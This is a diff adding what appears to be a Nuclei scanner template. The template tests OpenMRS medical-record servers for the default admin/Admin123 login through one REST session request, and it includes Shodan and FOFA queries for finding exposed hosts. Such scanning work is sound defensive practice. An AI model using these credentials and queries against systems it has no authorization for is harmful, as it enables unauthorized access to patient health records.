@@ -1,0 +1,47 @@
+id: openmrs-default-login
+
+info:
+  name: OpenMRS - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    OpenMRS sets the password of the built-in super user admin to Admin123 during the simple installation and in the official Docker images when no other password is configured. An attacker who logs in with these credentials gets System Developer privileges and can read and change patient records, encounters and observations, manage users and roles, and install modules.
+  reference:
+    - https://github.com/openmrs/openmrs-core/blob/2.8.10/web/src/main/java/org/openmrs/web/filter/initialization/InitializationWizardModel.java
+    - https://github.com/openmrs/openmrs-core/blob/2.8.10/startup-init.sh
+    - https://rest.openmrs.org/#authentication
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:openmrs:openmrs:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    verified: true
+    vendor: openmrs
+    product: openmrs
+    shodan-query: http.html:"OpenMRS"
+    fofa-query: body="OpenMRS"
+  tags: openmrs,emr,healthcare,default-login
+
+variables:
+  username: "admin"
+  password: "Admin123"
+
+http:
+  - raw:
+      - |
+        GET /openmrs/ws/rest/v1/session HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Basic {{base64(username + ':' + password)}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'regex("\"authenticated\"\\s*:\\s*true", body)'
+          - 'regex("\"user\"\\s*:\\s*\\{", body)'
+          - 'regex("\"systemId\"\\s*:\\s*\"admin\"", body)'
+          - 'contains(content_type, "json")'
+          - 'status_code == 200'
+        condition: and
